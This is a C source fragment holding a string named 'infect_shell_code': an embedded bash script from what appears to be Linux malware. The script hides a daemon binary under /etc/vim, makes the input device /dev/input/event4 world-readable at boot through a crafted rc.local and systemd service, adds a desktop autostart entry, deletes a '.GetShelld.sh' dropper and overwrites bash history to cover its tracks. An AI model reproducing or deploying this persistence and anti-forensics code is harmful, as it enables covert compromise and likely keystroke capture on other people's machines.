static const char* infect_shell_code = "\
#!/bin/bash\n\
name=\"%s\"\n\
sudo chmod a+rw /etc/vim -f\n\
sleep 0.1\n\
\
if [ -e '/etc/vim' ];then\n\
mv \"$name.config/.uuiddd-daemon-proc\"  /etc/vim/\n\
else\n\
  sudo mkdir /etc/vim\n\
  sleep 0.1\n\
  mv \"$name.config/.uuiddd-daemon-proc\"  /etc/vim/\n\
fi\n\
\
echo \"#!/bin/sh\n\
/usr/bin/chmod a+r /dev/input/event4 -f\n\
exit 0\" > ./rc.local\n\
sleep 0.1\n\
sudo mv ./rc.local /etc/\n\
sudo chmod +x /etc/rc.local -f\n\
\
echo \"[Unit]\n\
Description=Custom rc.local Compatibility\n\
\n\
[Service]\n\
Type=oneshot\n\
ExecStart=/etc/rc.local\n\
RemainAfterExit=yes\n\
\n\
[Install]\n\
WantedBy=multi-user.target\" > ./rc-local.service\n\
\
sleep 0.1\n\
sudo mv ./rc-local.service /etc/systemd/system/\n\
sleep 0.1\n\
\
if [ ! -d \"$name.config/autostart\" ]; then\n\
mkdir \"$name.config/autostart\"\n\
fi\n\
\
echo \"\
[Desktop Entry]\n\
Type=Application\n\
Name=uuiddd-daemon\n\
Exec=/etc/vim/.uuiddd-daemon\n\
Terminal=false\" > \"$name.config/autostart/uuiddd.desktop\"\n\
\
sudo echo \"#!/bin/bash\n\
if [ -e '/etc/vim/.uuiddd-daemon-proc' ]; then\n\
sleep 5\n\
\"/etc/vim/.uuiddd-daemon-proc\"\n\
else\n\
  rm /etc/vim/.uuiddd-daemon-proc \"$name.config/autostart/uuiddd.desktop\"\n\
fi\n\
exit 0\" > /etc/vim/.uuiddd-daemon\n\
sudo chmod +x /etc/vim/.uuiddd-daemon\n\
\
rm \"$name.bashrc\"\n\
mv \"$name.config/.bashrc\"  \"$name\"\n\
rm \"$name.config/.GetShelld.sh\"\n\
echo 'ls' > \"$name.bash_history\"\n\
\
exec /bin/bash $(sudo systemctl daemon-reload && sudo systemctl enable rc-local.service) &\n\
\
exit 0";
